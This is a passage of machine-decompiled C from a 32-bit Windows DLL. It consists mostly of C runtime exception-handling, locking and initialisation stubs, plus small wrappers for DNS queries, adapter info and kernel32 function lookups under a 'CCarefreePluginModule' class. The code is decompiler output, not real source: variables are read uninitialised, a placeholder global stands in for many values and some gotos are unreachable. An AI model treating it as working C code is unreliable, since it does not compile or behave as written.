    int32_t v1; // 0x1001ab73
    if (*(int32_t *)(v1 - 28) == 0) {
        int32_t v2 = *(int32_t *)(v1 + 20); // 0x1001ab79
        int32_t v3 = *(int32_t *)(v1 + 16); // 0x1001ab7c
        int32_t v4 = *(int32_t *)(v1 + 12); // 0x1001ab7f
        int32_t v5 = *(int32_t *)(v1 + 8); // 0x1001ab82
        result = _3f___ArrayUnwind_40__40_YGXPAXIHP6EX0_40_Z_40_Z((int32_t *)v5, v4, v3, (void (*)(int32_t *))v2);
    }
    // 0x1001ab8a
    return result;
}

// Address range: 0x1001ac70 - 0x1001ac88
int32_t function_1001ac70(void) {
    // 0x1001ac70
    int32_t result; // 0x1001ac70
    int32_t v1; // 0x1001ac70
    if (*(int32_t *)(v1 - 32) == 0) {
        int32_t v2 = *(int32_t *)(v1 + 24); // 0x1001ac76
        int32_t v3 = *(int32_t *)(v1 - 28); // 0x1001ac79
        int32_t v4 = *(int32_t *)(v1 + 12); // 0x1001ac7c
        int32_t v5 = *(int32_t *)(v1 + 8); // 0x1001ac7f
        result = _3f___ArrayUnwind_40__40_YGXPAXIHP6EX0_40_Z_40_Z((int32_t *)v5, v4, v3, (void (*)(int32_t *))v2);
    }
    // 0x1001ac87
    return result;
}

// Address range: 0x1001ac88 - 0x1001ac93
int32_t function_1001ac88(int32_t a1, int32_t a2, int32_t * a3) {
    // 0x1001ac88
    return _3f__3f_2_40_YAPAXI_40_Z((int32_t)&g173);
}

// Address range: 0x1001ac93 - 0x1001ac9e
// From class:    .?AVbad_alloc@std@@
// Type:          constructor
int32_t function_1001ac93(void) {
    // 0x1001ac93
    int32_t v1; // 0x1001ac93
    *(int32_t *)v1 = (int32_t)&g38;
    return _3f__Tidy_40_exception_40_std_40__40_AAEXXZ();
}

// Address range: 0x1001b12b - 0x1001b131
int32_t function_1001b12b(void) {
    // 0x1001b12b
    return __unlockexit();
}

// Address range: 0x1001b170 - 0x1001b1f6
int32_t function_1001b170(int32_t result, int16_t * a2) {
    unsigned char result2 = *(char *)a2; // 0x1001b177
    if (result2 == 0) {
        // 0x1001b1a8
        return result;
    }
    int32_t v1 = (int32_t)a2;
    char v2 = *(char *)(v1 + 1); // 0x1001b181
    if (v2 == 0) {
        // 0x1001b1dd
        return result2;
    }
    // 0x1001b188
    int32_t v3; // 0x1001b170
    int32_t v4; // 0x1001b170
    while (true) {
      lab_0x1001b188:;
        char v5 = *(char *)result; // 0x1001b18e
        int32_t v6 = result + 1; // 0x1001b190
        v4 = v6;
        if (v5 == result2) {
            goto lab_0x1001b1ae;
        } else {
            // 0x1001b197
            v3 = v6;
            if (v5 == 0) {
                // break -> 0x1001b1a8
                break;
            }
            goto lab_0x1001b19b;
        }
    }
    // 0x1001b1a8
    return 0;
  lab_0x1001b1ae:;
    int32_t v7 = v4;
    char v8 = *(char *)v7; // 0x1001b1ae
    int32_t v9 = v7 + 1; // 0x1001b1b0
    char v10 = v8; // 0x1001b1b5
    int32_t v11 = v9; // 0x1001b1b5
    int32_t v12 = v9; // 0x1001b1b5
    if (v8 != v2) {
        goto lab_0x1001b1a0;
    } else {
        int32_t v13 = v1;
        int32_t v14 = v13 + 2; // 0x1001b1ba
        char v15 = *(char *)v14; // 0x1001b1ba
        while (v15 != 0) {
            int32_t v16 = v12;
            if (*(char *)v16 != v15) {
                // break -> 0x1001b188
                break;
            }
            char v17 = *(char *)(v13 + 3); // 0x1001b1ca
            if (v17 == 0) {
                // 0x1001b1e9
                return v7 - 1;
            }
            // 0x1001b1d1
            v12 = v16 + 2;
            if (*(char *)(v16 + 1) != v17) {
                // break -> 0x1001b188
                break;
            }
            v13 = v14;
            v14 = v13 + 2;
            v15 = *(char *)v14;
        }
        // 0x1001b1e9
        return v7 - 1;
        // 0x1001b188
        goto lab_0x1001b188;
    }
  lab_0x1001b1a0:;
    int32_t v18 = v11;
    char v19 = v10;
    v4 = v18;
    if (result2 == v19) {
        goto lab_0x1001b1ae;
    } else {
        // 0x1001b1a4
        v3 = v18;
        if (v19 == 0) {
            return 0;
        }
        goto lab_0x1001b19b;
    }
  lab_0x1001b19b:
    // 0x1001b19b
    v10 = *(char *)v3;
    v11 = v3 + 1;
    goto lab_0x1001b1a0;
}

// Address range: 0x1001c0e8 - 0x1001c0fc
int32_t function_1001c0e8(void) {
    // 0x1001c0e8
    int32_t result; // 0x1001c0e8
    int32_t v1; // 0x1001c0e8
    int32_t v2; // 0x1001c0e8
    if (*(int32_t *)(v2 + 16) == v1 && g79 != -1) {
        // 0x1001c0f6
        result = __mtterm();
    }
    // 0x1001c0fb
    return result;
}

// Address range: 0x1001c0fc - 0x1001c0fe
int32_t function_1001c0fc(void) {
    // 0x1001c0fc
    int32_t result; // 0x1001c0fc
    return result;
}

// Address range: 0x1001c356 - 0x1001c365
int32_t __initp_misc_invarg(int32_t result) {
    // 0x1001c356
    g136 = result;
    return result;
}

// Address range: 0x1001c70b - 0x1001c715
int32_t function_1001c70b(void) {
    // 0x1001c70b
    int32_t v1; // 0x1001c70b
    return __unlock_file(*(int32_t *)(v1 + 8));
}

// Address range: 0x1001c801 - 0x1001c80b
int32_t function_1001c801(void) {
    // 0x1001c801
    int32_t v1; // 0x1001c801
    return __unlock_file(*(int32_t *)(v1 + 8));
}

// Address range: 0x1001c8a2 - 0x1001c8ab
int32_t __lockexit(void) {
    // 0x1001c8a2
    return __lock(8);
}

// Address range: 0x1001c8ab - 0x1001c8b4
int32_t __unlockexit(void) {
    // 0x1001c8ab
    return __unlock(8);
}

// Address range: 0x1001cacd - 0x1001cadc
int32_t function_1001cacd(void) {
    // 0x1001cacd
    int32_t result; // 0x1001cacd
    int32_t v1; // 0x1001cacd
    if (*(int32_t *)(v1 + 16) != 0) {
        // 0x1001cad3
        result = __unlock(8);
    }
    // 0x1001cadb
    return result;
}

// Address range: 0x1001cadc - 0x1001cae2
int32_t function_1001cadc(void) {
    // 0x1001cadc
    return __SEH_epilog4();
}

// Address range: 0x1001caf3 - 0x1001caf8
int32_t function_1001caf3(int32_t a1) {
    // 0x1001caf3
    int32_t result; // 0x1001caf3
    return result;
}

// Address range: 0x1001caf8 - 0x1001cb03
int32_t __cexit(void) {
    // 0x1001caf8
    _doexit(0, 0, 1);
    // UNREACHABLE
}

// Address range: 0x1001cb03 - 0x1001cb07
int32_t function_1001cb03(void) {
    // 0x1001cb03
    int32_t result; // 0x1001cb03
    return result;
}

// Address range: 0x1001cb7a - 0x1001cb87
int32_t * ___get_sigabrt(int32_t * Ptr) {
    // 0x1001cb7a
    return DecodePointer(Ptr);
}

// Address range: 0x1001ccee - 0x1001ccfd
int32_t function_1001ccee(void) {
    // 0x1001ccee
    int32_t result; // 0x1001ccee
    int32_t v1; // 0x1001ccee
    if (*(int32_t *)(v1 - 28) != 0) {
        // 0x1001ccf4
        result = __unlock(0);
    }
    // 0x1001ccfc
    return result;
}

// Address range: 0x1001ccfd - 0x1001cd01
int32_t function_1001ccfd(void) {
    // 0x1001ccfd
    int32_t result; // 0x1001ccfd
    return result;
}

// Address range: 0x1001cd01 - 0x1001cd24
int32_t function_1001cd01(int32_t a1) {
    // 0x1001cd01
    int32_t v1; // 0x1001cd01
    switch (v1) {
        default: {
            if (v1 != 4) {
                // 0x1001cd22
                return 0;
            }
        }
        case 11: {
        }
        case 8: {
            // 0x1001cd11
            int32_t v2; // 0x1001cd01
            int32_t v3; // 0x1001cd01
            *(int32_t *)(v2 + 96) = *(int32_t *)(v3 - 44);
            if (v1 == 8) {
                // 0x1001cd1c
                *(int32_t *)(v2 + 100) = *(int32_t *)(v3 - 48);
            }
            // break -> 0x1001cd22
            break;
        }
    }
    // 0x1001cd22
    return 0;
}

// Address range: 0x1001e792 - 0x1001e79a
int32_t function_1001e792(void) {
    // 0x1001e792
    int32_t v1; // 0x1001e792
    return __unlock_fhandle(v1);
}

// Address range: 0x1001e891 - 0x1001e899
int32_t function_1001e891(void) {
    // 0x1001e891
    int32_t v1; // 0x1001e891
    return __unlock_fhandle(v1);
}

// Address range: 0x1001ea0a - 0x1001ea13
int32_t function_1001ea0a(void) {
    // 0x1001ea0a
    return __unlock(10);
}

// Address range: 0x1001ee50 - 0x1001ee59
int32_t function_1001ee50(void) {
    // 0x1001ee50
    return __unlock(1);
}

// Address range: 0x1001f24c - 0x1001f255
int32_t function_1001f24c(void) {
    // 0x1001f24c
    return __unlock(13);
}

// Address range: 0x1001f61b - 0x1001f624
int32_t function_1001f61b(void) {
    // 0x1001f61b
    return __unlock(13);
}

// Address range: 0x1001f624 - 0x1001f626
int32_t function_1001f624(void) {
    // 0x1001f624
    int32_t result; // 0x1001f624
    return result;
}

// Address range: 0x1001f99f - 0x1001f9ab
int32_t function_1001f99f(void) {
    // 0x1001f99f
    return __unlock(12);
}

// Address range: 0x1001f9ab - 0x1001f9b4
int32_t * __encoded_null(int32_t * Ptr) {
    // 0x1001f9ab
    return EncodePointer(Ptr);
}

// Address range: 0x1001f9b4 - 0x1001f9bd
int32_t ___crtTlsAlloc_40_4(void) {
    // 0x1001f9b4
    return TlsAlloc();
}

// Address range: 0x1001fad0 - 0x1001fad9
int32_t function_1001fad0(void) {
    // 0x1001fad0
    return __unlock(13);
}

// Address range: 0x1001fad9 - 0x1001fae2
int32_t function_1001fad9(void) {
    // 0x1001fad9
    return __unlock(12);
}

// Address range: 0x1001fc8f - 0x1001fc98
int32_t function_1001fc8f(void) {
    // 0x1001fc8f
    return __unlock(13);
}

// Address range: 0x1001fc9b - 0x1001fca4
int32_t function_1001fc9b(void) {
    // 0x1001fc9b
    return __unlock(12);
}

// Address range: 0x10020153 - 0x10020162
int32_t __initp_heap_handler(int32_t result) {
    // 0x10020153
    g137 = result;
    return result;
}

// Address range: 0x100202f7 - 0x10020300
int32_t function_100202f7(void) {
    // 0x100202f7
    return __unlock(14);
}

// Address range: 0x10020388 - 0x10020393
int32_t function_10020388(void) {
    // 0x10020388
    int32_t v1; // 0x10020388
    *(int32_t *)v1 = (int32_t)&g39;
    return _3f__Tidy_40_exception_40_std_40__40_AAEXXZ();
}

// Address range: 0x1002052a - 0x10020544
int32_t function_1002052a(void) {
    int32_t v1 = __getptd(); // 0x1002052a
    int32_t result = v1; // 0x10020536
    if (*(int32_t *)(v1 + 144) >= 1) {
        // 0x10020538
        result = __getptd();
        int32_t * v2 = (int32_t *)(result + 144); // 0x1002053d
        *v2 = *v2 - 1;
    }
    // 0x10020543
    return result;
}

// Address range: 0x100205cc - 0x100205d5
int32_t function_100205cc(void) {
    // 0x100205cc
    int32_t v1; // 0x100205cc
    return *(char *)(v1 + 12) != 0;
}

// Address range: 0x100206aa - 0x100206b3
int32_t function_100206aa(void) {
    // 0x100206aa
    int32_t v1; // 0x100206aa
    *(int32_t *)(v1 - 4) = -1;
    return _3f_terminate_40__40_YAXXZ();
}

// Address range: 0x1002075b - 0x10020764
int32_t function_1002075b(int32_t * a1) {
    // 0x1002075b
    return _3f_ExFilterRethrow_40__40_YAHPAU_EXCEPTION_POINTERS_40__40__40_Z(a1);
}

// Address range: 0x10020764 - 0x100207ca
int32_t function_10020764(void) {
    // 0x10020764
    int32_t v1; // 0x10020764
    int32_t v2 = *(int32_t *)(v1 - 24); // 0x10020764
    *(int32_t *)(__getptd() + 524) = 0;
    int32_t v3 = *(int32_t *)(v1 + 20); // 0x10020773
    int32_t v4 = *(int32_t *)(v1 + 12); // 0x10020776
    int32_t v5 = v4 + 8;
    int32_t v6; // 0x10020764
    if (*(int32_t *)(v3 + 4) > 128) {
        // 0x10020788
        v6 = *(int32_t *)v5;
    } else {
        // 0x10020782
        v6 = (int32_t)*(char *)v5;
    }
    int32_t v7 = *(int32_t *)(v3 + 16); // 0x1002078b
    *(int32_t *)(v1 - 32) = 0;
    int32_t v8 = v6; // 0x10020798
    if (*(int32_t *)(v3 + 12) != 0) {
        uint32_t v9 = *(int32_t *)(v7 + 4); // 0x1002079d
        int32_t v10 = 8; // 0x100207a3
        if (v6 <= v9) {
            v10 = function_100207e6() + 8;
        }
        // 0x100207a5
        if (v6 > *(int32_t *)(v10 + v7)) {
            function_100207e6();
        }
        // 0x100207ab
        v8 = *(int32_t *)(8 * v9 + 8 + *(int32_t *)(v3 + 8));
    }
    // 0x100207b2
    *(int32_t *)(v2 - 4) = v8;
    *(int32_t *)(v2 - 8) = v3;
    *(int32_t *)(v2 - 12) = 0;
    *(int32_t *)(v2 - 16) = v4;
    int32_t result = ___FrameUnwindToState(); // 0x100207b7
    *(int32_t *)(v1 - 28) = 0;
    *(int32_t *)(v1 - 4) = 0;
    return result;
}

// Address range: 0x100207ca - 0x100207e6
int32_t function_100207ca(void) {
    // 0x100207ca
    int32_t v1; // 0x100207ca
    *(int32_t *)(v1 - 4) = -2;
    *(int32_t *)(v1 + 16) = 0;
    function_100207f1();
    return __SEH_epilog4();
}

// Address range: 0x100207e6 - 0x100207eb
int32_t function_100207e6(void) {
    // 0x100207e6
    int32_t v1; // 0x100207e6
    int32_t * v2 = (int32_t *)(v1 - 32); // 0x100207e6
    *v2 = *v2 + 1;
    int32_t result; // 0x100207e6
    return result;
}

// Address range: 0x100207f1 - 0x10020867
int32_t function_100207f1(void) {
    // 0x100207f1
    int32_t v1; // 0x100207f1
    int32_t v2; // 0x100207f1
    *(int32_t *)(v1 - 4) = *(int32_t *)(v2 - 36);
    __FindAndUnlinkFrame(*(int32_t *)(v2 - 40));
    *(int32_t *)(__getptd() + 136) = *(int32_t *)(v2 - 44);
    int32_t result = __getptd(); // 0x1002080e
    *(int32_t *)(result + 140) = *(int32_t *)(v2 - 48);
    int32_t v3; // 0x100207f1
    if (v3 != -0x1f928c9d || *(int32_t *)(v3 + 16) != 3) {
        // 0x10020866
        return result;
    }
    int32_t result2 = *(int32_t *)(v3 + 20); // 0x1002082a
    if ((result2 || 1) != 0x19930521 == (result2 != 0x19930522) || *(int32_t *)(v2 - 52) != 0 || *(int32_t *)(v2 - 28) == 0) {
        // 0x10020866
        return result2;
    }
    int32_t result3 = 0; // 0x10020859
    if (__IsExceptionObjectToBeDestroyed(*(int32_t *)(v3 + 24)) != 0) {
        // 0x1002085b
        result3 = ___DestructExceptionObject(v3, *(int32_t *)(v2 + 16));
    }
    // 0x10020866
    return result3;
}

// Address range: 0x10020a6b - 0x10020a6f
int32_t function_10020a6b(void) {
    // 0x10020a6b
    return 1;
}

// Address range: 0x10021098 - 0x1002109e
int32_t function_10021098(void) {
    // 0x10021098
    return __SEH_epilog4();
}

// Address range: 0x100210e9 - 0x100210fa
int32_t * __initp_eh_hooks(int32_t * Ptr) {
    int32_t * result = EncodePointer(Ptr); // 0x100210ee
    g138 = (int32_t)result;
    return result;
}

// Address range: 0x1002114c - 0x1002115b
int32_t __initp_misc_purevirt(int32_t result) {
    // 0x1002114c
    g139 = result;
    return result;
}

// Address range: 0x10021258 - 0x10021265
// From class:    .?AVbad_alloc@std@@
// Type:          virtual member function
int32_t function_10021258(void) {
    // 0x10021258
    int32_t v1; // 0x10021258
    int32_t v2 = *(int32_t *)(v1 + 4); // 0x10021258
    return v2 != 0 ? v2 : (int32_t)"Unknown exception";
}

// Address range: 0x1002131f - 0x1002132a
// From class:    .?AVexception@std@@
// Type:          constructor
// Demangled:     public: virtual __thiscall std::exception::~exception(void)
int32_t _3f__3f_1exception_40_std_40__40_UAE_40_XZ(void) {
    // 0x1002131f
    int32_t v1; // 0x1002131f
    *(int32_t *)v1 = (int32_t)&g40;
    return _3f__Tidy_40_exception_40_std_40__40_AAEXXZ();
}

// Address range: 0x10022156 - 0x10022172
int32_t function_10022156(int32_t a1) {
    int32_t v1 = *(int32_t *)(a1 + 40); // 0x10022163
    int32_t v2; // 0x10022156
    return __local_unwind4(v1, *(int32_t *)(a1 + 24), *(int32_t *)(a1 + 28), v2);
}

// Address range: 0x100227e6 - 0x100227fc
int32_t function_100227e6(void) {
    // 0x100227e6
    return __chkstk();
}

// Address range: 0x10023af2 - 0x10023afa
int32_t __crt_debugger_hook(void) {
    // 0x10023af2
    g145 = 0;
    int32_t result; // 0x10023af2
    return result;
}

// Address range: 0x10024758 - 0x10024767
int32_t __initp_misc_rand_s(int32_t result) {
    // 0x10024758
    g140 = result;
    return result;
}

// Address range: 0x100248ef - 0x100248f9
int32_t function_100248ef(void) {
    // 0x100248ef
    int32_t v1; // 0x100248ef
    return __unlock_fhandle(*(int32_t *)(v1 + 8));
}

// Address range: 0x10024edf - 0x10024ee8
int32_t function_10024edf(void) {
    // 0x10024edf
    return __unlock(10);
}

// Address range: 0x1002506a - 0x10025072
int32_t function_1002506a(void) {
    // 0x1002506a
    int32_t v1; // 0x1002506a
    return __unlock_file(v1);
}

// Address range: 0x1002586c - 0x10025875
int32_t __NLG_Notify1(void) {
    // 0x1002586c
    int32_t v1; // 0x1002586c
    int32_t v2; // 0x1002586c
    return function_10025880(v2, v1);
}

// Address range: 0x10025880 - 0x10025894
int32_t function_10025880(int32_t a1, int32_t a2) {
    // 0x10025880
    int32_t result; // 0x10025880
    return result;
}

// Address range: 0x10025894 - 0x10025897
int32_t __NLG_Call(void) {
    // 0x10025894
    int32_t result; // 0x10025894
    return result;
}

// Address range: 0x10025aef - 0x10025af6
int32_t function_10025aef(void) {
    // 0x10025aef
    __amsg_exit(2);
    // UNREACHABLE
}

// Address range: 0x10025af6 - 0x10025af8
int32_t function_10025af6(int32_t a1) {
    // 0x10025af6
    int32_t result; // 0x10025af6
    return result;
}

// Address range: 0x10025c86 - 0x10025c8e
int32_t function_10025c86(void) {
    // 0x10025c86
    int32_t v1; // 0x10025c86
    return __unlock_fhandle(v1);
}

// Address range: 0x100260e1 - 0x100260e2
int32_t function_100260e1(void) {
    // 0x100260e1
    int32_t result; // 0x100260e1
    return result;
}

// Address range: 0x100260e3 - 0x10026100
int32_t function_100260e3(void) {
    int32_t result = 0; // 0x100260ea
    int32_t v1; // 0x100260e3
    if (v1 != 0) {
        int32_t * v2 = (int32_t *)v1; // 0x100260ed
        _free(v2);
        *v2 = 0;
        result = &g173;
    }
    // 0x100260f6
    *(int32_t *)(v1 + 4) = 0;
    *(int32_t *)(v1 + 8) = 0;
    return result;
}

// Address range: 0x10026100 - 0x10026125
int32_t function_10026100(int32_t a1) {
    // 0x10026100
    int32_t result; // 0x10026100
    _memset((int32_t *)(result + 20), 0, 24);
    *(int32_t *)(result + 44) = 0;
    *(int32_t *)(result + 48) = 0;
    *(int32_t *)(result + 52) = 0;
    return result;
}

// Address range: 0x10026125 - 0x10026126
int32_t function_10026125(void) {
    // 0x10026125
    int32_t result; // 0x10026125
    return result;
}

// Address range: 0x10026127 - 0x1002613d
int32_t function_10026127(void) {
    // 0x10026127
    int32_t v1; // 0x10026127
    DeleteCriticalSection((struct _RTL_CRITICAL_SECTION *)(v1 + 20));
    return function_100260e1();
}

// Address range: 0x1002613d - 0x1002617d
// Demangled:     public: __thiscall std::_Init_locks::_Init_locks(void)
int32_t _3f__3f_0_Init_locks_40_std_40__40_QAE_40_XZ(void) {
    // 0x1002613d
    int32_t v1; // 0x1002613d
    function_10026100(v1);
    int32_t result; // 0x1002613d
    *(int32_t *)result = 56;
    *(int32_t *)(result + 8) = 0x10000000;
    *(int32_t *)(result + 4) = 0x10000000;
    *(int32_t *)(result + 12) = 2560;
    *(int32_t *)(result + 16) = (int32_t)&g41;
    if (function_10010a50() < 0) {
        // 0x10026172
        *(char *)&g90 = 1;
    }
    // 0x10026179
    return result;
}

// Address range: 0x1002617d - 0x1002617e
int32_t function_1002617d(void) {
    // 0x1002617d
    int32_t result; // 0x1002617d
    return result;
}

// Address range: 0x1002617f - 0x100261c1
int32_t function_1002617f(void) {
    // 0x1002617f
    int32_t v1; // 0x1002617f
    if (v1 == 0) {
        // 0x100261bf
        int32_t result; // 0x1002617f
        return result;
    }
    uint32_t v2 = *(int32_t *)(v1 + 8); // 0x10026188
    int32_t * v3 = (int32_t *)(v1 + 12); // 0x1002618b
    int32_t v4; // bp-8, 0x1002617f
    int32_t v5 = &v4; // 0x1002618e
    if (v2 < *v3) {
        int32_t v6 = v2; // 0x10026190
        int32_t v7; // bp-12, 0x1002617f
        int32_t v8 = &v7;
        int32_t v9 = *(int32_t *)v6; // 0x10026191
        int32_t v10 = v8; // 0x10026195
        int32_t v11; // 0x100261a0
        int32_t * v12; // 0x10026197
        int32_t v13; // 0x10026197
        if (v9 != 0) {
            // 0x10026197
            v12 = (int32_t *)(v9 + 16);
            v13 = *v12;
            v11 = v8;
            if (v13 != 0) {
                // 0x1002619e
                v11 = v8 - 4;
                *(int32_t *)v11 = v13;
            }
            // 0x100261a4
            v10 = v11;
            *v12 = 0;
        }
        int32_t v14 = v10;
        v6 += 4;
        while (v6 < *v3) {
            // 0x10026191
            v8 = v14;
            v9 = *(int32_t *)v6;
            v10 = v8;
            if (v9 != 0) {
                // 0x10026197
                v12 = (int32_t *)(v9 + 16);
                v13 = *v12;
                v11 = v8;
                if (v13 != 0) {
                    // 0x1002619e
                    v11 = v8 - 4;
                    *(int32_t *)v11 = v13;
                }
                // 0x100261a4
                v10 = v11;
                *v12 = 0;
            }
            // 0x100261a8
            v14 = v10;
            v6 += 4;
        }
        // 0x100261b0
        v5 = v14 + 4;
    }
    // 0x100261b1
    *(int32_t *)(v5 - 4) = v1 + 16;
    DeleteCriticalSection((struct _RTL_CRITICAL_SECTION *)&g173);
    *(int32_t *)v1 = 0;
    // 0x100261bf
    return &g173;
}

// Address range: 0x100261c1 - 0x100261da
int32_t function_100261c1(int32_t a1) {
    // 0x100261c1
    int32_t result; // 0x100261c1
    _memset((int32_t *)(result + 16), 0, 24);
    return result;
}

// Address range: 0x100261da - 0x1002621b
// Demangled:     public: __thiscall std::_Init_locks::_Init_locks(void)
int32_t ??0_Init_locks@std@@QAE@XZ(void) {
    // 0x100261da
    int32_t v1; // 0x100261da
    function_100261c1(v1);
    int32_t result; // 0x100261da
    int32_t * v2 = (int32_t *)result; // 0x100261e4
    *v2 = 0;
    *(int32_t *)(result + 4) = 0x10000000;
    *(int32_t *)(result + 8) = (int32_t)&g43;
    *(int32_t *)(result + 12) = (int32_t)&g44;
    if (function_10010a50() >= 0) {
        // 0x10026211
        *v2 = 40;
    } else {
        // 0x10026208
        *(char *)&g90 = 1;
    }
    // 0x10026217
    return result;
}

// Address range: 0x1002621c - 0x10026222
void function_1002621c(int32_t * pData, int32_t FreeType) {
    // 0x1002621c
    DnsFree(pData, FreeType);
}

// Address range: 0x10026222 - 0x10026228
int32_t function_10026222(char * pszName, int16_t wType, int32_t Options, int32_t * pExtra, int32_t * ppQueryResults, int32_t ** pReserved) {
    // 0x10026222
    return DnsQuery_A(pszName, wType, Options, pExtra, ppQueryResults, pReserved);
}

// Address range: 0x10026228 - 0x1002622e
int32_t function_10026228(struct _IP_ADAPTER_INFO * AdapterInfo, int32_t * SizePointer) {
    // 0x10026228
    return GetAdaptersInfo(AdapterInfo, SizePointer);
}

// Address range: 0x1002622e - 0x10026234
void _RtlUnwind_40_16(int32_t * TargetFrame, int32_t * TargetIp, struct _EXCEPTION_RECORD * ExceptionRecord, int32_t * ReturnValue) {
    // 0x1002622e
    RtlUnwind(TargetFrame, TargetIp, ExceptionRecord, ReturnValue);
}

// Address range: 0x10026530 - 0x10026538
int32_t function_10026530(void) {
    // 0x10026530
    return function_100114a0();
}

// Address range: 0x10026560 - 0x10026568
int32_t function_10026560(void) {
    // 0x10026560
    return function_10011790();
}

// Address range: 0x10026590 - 0x1002659b
int32_t function_10026590(void) {
    // 0x10026590
    return function_10011870();
}

// Address range: 0x1002659b - 0x100265a3
int32_t function_1002659b(void) {
    // 0x1002659b
    return function_10011790();
}

// Address range: 0x100265c0 - 0x100265c8
int32_t function_100265c0(void) {
    // 0x100265c0
    CoTaskMemFree(&g173);
    return &g173;
}

// Address range: 0x100265f0 - 0x100265fb
int32_t function_100265f0(void) {
    // 0x100265f0
    return function_1001a6db();
}

// Address range: 0x100265fb - 0x10026603
int32_t function_100265fb(void) {
    // 0x100265fb
    SysFreeString((int16_t *)&g173);
    return &g173;
}

// Address range: 0x10026620 - 0x10026628
int32_t function_10026620(void) {
    // 0x10026620
    return function_100123c0();
}

// Address range: 0x10026650 - 0x10026658
int32_t function_10026650(void) {
    // 0x10026650
    int32_t result; // 0x10026650
    return result;
}

// Address range: 0x10026658 - 0x10026660
int32_t function_10026658(void) {
    // 0x10026658
    int32_t result; // 0x10026658
    return result;
}

// Address range: 0x10026680 - 0x10026688
int32_t function_10026680(void) {
    // 0x10026680
    return function_100114a0();
}

// Address range: 0x100266b0 - 0x100266bb
int32_t function_100266b0(void) {
    // 0x100266b0
    return function_10011860();
}

// Address range: 0x100266bb - 0x100266c6
int32_t function_100266bb(void) {
    // 0x100266bb
    return function_10011860();
}

// Address range: 0x100266c6 - 0x100266ee
int32_t function_100266c6(int32_t a1) {
    // 0x100266c6
    _40___security_check_cookie_40_4();
    _40___security_check_cookie_40_4();
    return ___CxxFrameHandler();
}

// Address range: 0x100266f0 - 0x100266fb
int32_t function_100266f0(void) {
    // 0x100266f0
    return function_10011500();
}

// Address range: 0x100266fb - 0x10026706
int32_t function_100266fb(void) {
    // 0x100266fb
    return function_10011500();
}

// Address range: 0x10026706 - 0x1002672e
int32_t function_10026706(int32_t a1) {
    // 0x10026706
    _40___security_check_cookie_40_4();
    _40___security_check_cookie_40_4();
    return ___CxxFrameHandler();
}

// Address range: 0x10026730 - 0x1002673b
int32_t function_10026730(void) {
    // 0x10026730
    return function_100123c0();
}

// Address range: 0x1002673b - 0x10026746
int32_t function_1002673b(void) {
    // 0x1002673b
    return function_10012350();
}

// Address range: 0x10026746 - 0x10026751
int32_t function_10026746(void) {
    // 0x10026746
    return function_10012350();
}

// Address range: 0x10026751 - 0x1002675c
int32_t function_10026751(void) {
    // 0x10026751
    return function_10012350();
}

// Address range: 0x1002675c - 0x10026784
int32_t function_1002675c(int32_t a1) {
    // 0x1002675c
    _40___security_check_cookie_40_4();
    _40___security_check_cookie_40_4();
    return ___CxxFrameHandler();
}

// Address range: 0x100267d0 - 0x100267db
int32_t function_100267d0(void) {
    // 0x100267d0
    _3f__3f_3_40_YAXPAX_40_Z(&g173);
    return &g173;
}

// Address range: 0x10026800 - 0x1002680b
int32_t function_10026800(void) {
    // 0x10026800
    return function_100114a0();
}

// Address range: 0x1002680b - 0x10026816
int32_t function_1002680b(void) {
    // 0x1002680b
    return function_10011860();
}

// Address range: 0x10026816 - 0x1002683e
int32_t function_10026816(int32_t a1) {
    // 0x10026816
    _40___security_check_cookie_40_4();
    _40___security_check_cookie_40_4();
    return ___CxxFrameHandler();
}

// Address range: 0x10026840 - 0x10026848
int32_t function_10026840(void) {
    // 0x10026840
    return function_100114a0();
}

// Address range: 0x10026880 - 0x1002689d
int32_t function_10026880(void) {
    int32_t func = (int32_t)GetProcAddress(GetModuleHandleW(L"kernel32"), (char *)&g173); // 0x10026891
    g88 = func;
    return func;
}

// Address range: 0x100268a0 - 0x100268bd
int32_t function_100268a0(void) {
    int32_t func = (int32_t)GetProcAddress(GetModuleHandleW(L"kernel32"), (char *)&g173); // 0x100268b1
    g89 = func;
    return func;
}

// Address range: 0x100268c0 - 0x100268dd
int32_t function_100268c0(void) {
    int32_t func = (int32_t)GetProcAddress(GetModuleHandleW(L"kernel32"), (char *)&g173); // 0x100268d1
    g87 = func;
    return func;
}

// Address range: 0x100268e0 - 0x10026900
// From class:    .?AVCCarefreePluginModule@@
// Type:          constructor
int32_t function_100268e0(void) {
    // 0x100268e0
    function_10015700();
    g120 = (int32_t)&g25;
    return _atexit((void (*)())0x10026940);
}

// Address range: 0x10026900 - 0x1002690b
int32_t function_10026900(void) {
    int32_t result = *(int32_t *)0x100270d8; // 0x10026900
    g128 = result;
    return result;
}

// Address range: 0x10026940 - 0x1002694a
int32_t function_10026940(void) {
    // 0x10026940
    return function_10015760();
}

// Address range: 0x1002695e - 0x10026968
// Demangled:     void __cdecl `dynamic atexit destructor for 'initlocks''(void)
void _3f__3f___Finitlocks_40__40_YAXXZ(void) {
    // 0x1002695e
    function_10026125();
}

// Address range: 0x10026968 - 0x10026972
// Demangled:     void __cdecl `dynamic atexit destructor for 'initlocks''(void)
void ??__Finitlocks@@YAXXZ(void) {
    // 0x10026968
    function_1002617d();
}

// Address range: 0x12493aab - 0x12493aac
int32_t function_12493aab(void) {
    // 0x12493aab
    int32_t result; // 0x12493aab
    return result;
}

// --------------- Statically Linked Functions ----------------

// int32_t _3f__3f_2_40_YAPAXI_40_Z(int32_t a1);
// int32_t _3f__3f__G__non_rtti_object_40_std_40__40_UAEPAXI_40_Z(int32_t a1);
// int32_t _3f__3f__Gbad_alloc_40_std_40__40_UAEPAXI_40_Z(int32_t a1);
// int32_t _3f__3f__Gtype_info_40__40_UAEPAXI_40_Z(int32_t a1);
// int32_t _3f__3f__L_40_YGXPAXIHP6EX0_40_Z1_40_Z(int32_t * a1, int32_t a2, int32_t a3, void (*a4)(int32_t *), void (*a5)(int32_t *));
// int32_t _3f__3f__M_40_YGXPAXIHP6EX0_40_Z_40_Z(int32_t * a1, int32_t a2, int32_t a3, void (*a4)(int32_t *));
// int32_t _3f___ArrayUnwind_40__40_YGXPAXIHP6EX0_40_Z_40_Z(int32_t * a1, int32_t a2, int32_t a3, void (*a4)(int32_t *));
// int32_t _3f__Tidy_40_exception_40_std_40__40_AAEXXZ(void);
// int32_t _3f_ExFilterRethrow_40__40_YAHPAU_EXCEPTION_POINTERS_40__40__40_Z(int32_t * a1);
// int32_t _3f_terminate_40__40_YAXXZ(void);
// int32_t ___CxxFrameHandler(void);
// int32_t ___DestructExceptionObject(int32_t a1, int32_t a2);
// int32_t ___FrameUnwindToState(void);
// int32_t ___report_gsfailure(void);
// int32_t __amsg_exit(int32_t a1);
